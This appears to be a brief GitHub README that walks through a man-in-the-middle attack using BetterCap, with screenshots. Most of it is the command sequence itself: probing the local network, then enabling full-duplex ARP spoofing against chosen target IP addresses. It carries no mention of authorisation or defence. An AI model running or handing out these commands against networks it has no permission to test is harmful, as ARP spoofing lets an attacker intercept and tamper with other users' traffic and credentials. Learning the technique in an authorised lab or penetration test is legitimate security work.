
# Man In the Middle Attack Using BetterCap


![veracode-appsec_man-middle-attack](https://github.com/eyeblech/man_in_the_middle/assets/78268197/9019f198-ead6-41b1-a4b9-f45d59904090)

```bash
#install bettercap on your linux system

bettercap -iface [network interface name]

#finding network interface name
```

![Screenshot from 2023-07-14 19-09-41](https://github.com/eyeblech/man_in_the_middle/assets/78268197/a6365573-f619-468a-837f-e668d3809aaa)


```bash
#wlp0s20f3 is my network interface name

help

help net.probe

#you can use help if you don't know what that specific thing does

net.probe on #this should be on for spoofing 

#Be MITM

help arp.spoof

set arp.spoof.fullduplex true

set arp.spoof.targets [targets ip, targets ip]

arp.spoof on

```
# Screenshot


![Screenshot from 2023-07-14 22-11-26](https://github.com/eyeblech/man_in_the_middle/assets/78268197/197fb233-70b1-4c24-b57d-987cc62e28fe)

